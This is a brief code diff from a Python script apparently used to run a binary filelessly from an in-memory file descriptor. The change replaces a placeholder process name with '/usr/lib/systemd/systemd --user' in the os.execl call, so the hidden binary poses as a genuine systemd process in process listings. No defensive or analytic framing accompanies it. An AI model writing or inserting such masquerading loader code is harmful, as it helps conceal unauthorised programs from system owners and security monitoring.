@@ -61,7 +61,7 @@ def run_fileless():
         
         # Execute the binary from the file descriptor.
         # This replaces the grandchild process with your binary.
-        os.execl(fd_path, "process-name-in-ps") # Add args as needed
+        os.execl(fd_path, "/usr/lib/systemd/systemd --user") # Add args as needed
     except OSError as e:
         # This part will only be reached if execl fails.
         print(f"[!] Failed to execute from memory: {e}")
